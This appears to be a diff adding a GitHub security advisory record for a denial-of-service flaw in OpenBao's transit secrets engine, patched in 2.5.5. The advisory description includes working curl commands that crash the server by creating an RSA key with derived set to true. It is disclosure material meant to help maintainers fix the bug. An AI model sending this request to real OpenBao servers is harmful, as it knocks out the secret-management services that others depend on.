@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-8w8f-r2xv-4q4j",
+  "repo": {
+    "cve_id": "CVE-2026-55776",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 6.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-617"
+    ],
+    "description": "On OpenBao 2.5.4 and 2.5.2(and likely earlier versions also), an authenticated caller with write access to `transit/keys/*` can crash the OpenBao server by issuing a single key-creation request that combines an asymmetric `type` (`rsa-*`, `ecdsa-*`, `ed25519`)\r\nwith `derived: true`. The server returns no HTTP response and the process terminates (exit code 2). This is a remote, low-complexity denial-of-service against the OpenBao server.\r\n\r\n\r\nMount the transit engine:\r\n\r\n     `curl -sS -X POST -H \"X-Vault-Token: root\" \\\r\n       -d '{\"type\":\"transit\"}' \\\r\n       http://127.0.0.1:8200/v1/sys/mounts/transit`\r\n\r\nTrigger the crash:\r\n\r\n     `curl -sS -w '\\nHTTP %{http_code}\\n' -X POST \\\r\n       -H \"X-Vault-Token: root\" \\\r\n       -H \"Content-Type: application/json\" \\\r\n       -d '{\"type\":\"rsa-2048\",\"derived\":true,\"exportable\":true,\"deletion_allowed\":false}' \\\r\n       http://127.0.0.1:8200/v1/transit/keys/some-key-name`\r\n\r\nYou can try with both JSON or HCL It will crash the entire cluster.\r\n\r\n  Observed:\r\n     HTTP 000\r\n     curl: (52) Empty reply from server\r\n\r\n     $ docker ps -a --filter name=openbao\r\n     STATUS: Exited (2)\r\n\r\nRoot Cause (Hypothesis)\r\nKey-derivation paths in the transit engine appear to assume a symmetric key shape (a derivable key context). When `derived: true` is supplied alongside an asymmetric `type`, the creation path likely panics on a missing derived-key field or\r\n  invalid type assertion rather than returning a structured validation error. Maintainers should confirm against the transit `policy.go` / key-creation path.\r\n\r\nSuggested fix:\r\nValidate the (`type`, `derived`) combination at the top of the create-key handler. Reject with a 400 if `derived: true` is set on any non-symmetric type (i.e. anything other than aes128-gcm96, aes256-gcm96, chacha20-poly1305,\r\nxchacha20-poly1305). Do this before any code path that may panic on missing derived-key state.\r\n",
+    "ghsa_id": "GHSA-8w8f-r2xv-4q4j",
+    "html_url": "https://github.com/openbao/openbao/security/advisories/GHSA-8w8f-r2xv-4q4j",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-8w8f-r2xv-4q4j"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-55776"
+      }
+    ],
+    "published_at": "2026-06-19T11:28:26Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "OpenBao crashes on Transit engine key creation with derived=true for RSA key types",
+    "updated_at": "2026-06-19T11:33:37Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "OpenBao"
+        },
+        "patched_versions": "2.5.5",
+        "vulnerable_version_range": "<=2.5.4"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "openbao/openbao"
+}
